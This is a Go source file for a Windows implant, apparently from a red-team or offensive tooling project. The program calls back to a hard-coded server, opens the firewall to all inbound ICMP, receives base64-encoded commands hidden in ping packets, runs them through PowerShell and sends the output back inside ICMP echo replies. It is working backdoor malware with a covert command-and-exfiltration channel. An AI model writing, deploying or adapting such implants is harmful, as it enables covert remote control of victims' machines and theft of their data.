// This is the code for the full on implant for windows targets

// TODO: Chunk data into queues
// TODO: Create Checkin routine with relevant data
// TODO: Implement secret Message for initial callback

package main

import (
	// Base Libs
	//"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	wapi "github.com/iamacarpet/go-win64api"
	uuid "github.com/satori/go.uuid"
	"log"
	"net"
	"os"
	"os/exec"
	//"syscall"
	"time"
	//"unsafe"

	//"github.com/satori/go.uuid"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const (
	// To be used as an egg later
	//secretMessage = "Activate"
	serverIP = "10.10.100.199"
)

func NewCallBack() {
	agentUuid := (uuid.NewV4()).String()
	data := EncodeData(agentUuid)
	SendData(data, 3)
	return
}

// SplitData is a function that will just take in a byte array and return it into a multi dimensional array
func SplitData(buf []byte, lim int) [][]byte {
	var chunk []byte
	chunks := make([][]byte, 0, len(buf)/lim+1)
	for len(buf) >= lim {
		chunk, buf = buf[:lim], buf[lim:]
		chunks = append(chunks, chunk)
	}
	if len(buf) > 0 {
		chunks = append(chunks, buf[:len(buf)])
	}
	return chunks
}

//func SplitData(data []byte, chunkSize int) [][]byte {
//	i := xslice.SplitToChunks(data, chunkSize)
//	ss := i.([][]byte)
//	return ss
//
//}

// EncodeData is a function that takes in a byte array and Encodes it into a b64 string
func EncodeData(input string) string {
	data := base64.StdEncoding.EncodeToString([]byte(input))
	return data
}

// SendData is a function that handles the sending of ICMP data within the payload header
// it takes in a string (should be b64'd) and a seq number (not really needed but good to include based on RFC).
func SendData(data string, seq int) {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatal(err)
	}

	wm := icmp.Message{
		Type: ipv4.ICMPTypeEchoReply, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: seq,
			Data: []byte(data),
		},
	}

	wb, err := wm.Marshal(nil)
	if err != nil {
		log.Fatal(err)
	}
	if _, err := conn.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(serverIP)}); err != nil {
		log.Fatalf("WriteTo err, %s", err)
	}

}

// PingListen is a function that handles the "server" portion of the implant
// Which will just listen for ICMP traffic, parse it, decode it, and then send it to a new powershell process
// in which it will then execute the command it received, encode it, and send it out
// Added a chunking portion that handles large data outputs
func PingListen(buf []byte, packetData int) {

	src := buf[8:packetData]

	hexToString := hex.EncodeToString(src)

	hexDecode, _ := hex.DecodeString(hexToString)

	base64Text := make([]byte, base64.StdEncoding.DecodedLen(len(hexDecode)))
	decode, _ := base64.StdEncoding.Decode(base64Text, []byte(hexDecode))

	command := base64Text[:decode]

	output, _ := exec.Command("powershell.exe", "/c", string(command)).Output()

	if len(output) > 6144 {
		chunked := SplitData(output, 6144)
		for _, row := range chunked {
			data := EncodeData(string(row))
			SendData(data, 3)
			time.Sleep(2 * time.Second)
		}

	} else {

		data := EncodeData(string(output))
		SendData(data, 3)
	}

}

func init() {
	NewCallBack()
}

func main() {

	// Enable ICMP Inbound
	r := wapi.FWRule{
		Name:              "Allow ICMP Inbound",
		Description:       "Start answering ICMP requests",
		Grouping:          "",
		Enabled:           true,
		Protocol:          wapi.NET_FW_IP_PROTOCOL_ICMPv4,
		Action:            wapi.NET_FW_ACTION_ALLOW,
		ICMPTypesAndCodes: "*", // https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml#icmp-parameters-types
	}

	ok, err := wapi.FirewallRuleAddAdvanced(r)
	if !ok {
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Printf("FW rule with name %q already exists.\n", r.Name)
		}
	}
	if ok {
		fmt.Println("Rule added!")
	}

	// while True loop to listen for ICMP data
	for {

		protocol := "icmp"

		netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
		if err != nil {
			fmt.Printf("[-] Error in Resolve IPAddr: %s\n\n", err)
		}

		conn, err := net.ListenIP("ip4:"+protocol, netaddr)
		if err != nil {
			fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
		}

		buf := make([]byte, 100000)

		packetData, _, err := conn.ReadFrom(buf)
		if err != nil {
			fmt.Printf("[+] Error reading packet data, %s\n\n", err)
		}

		go PingListen(buf, packetData)

	}
}
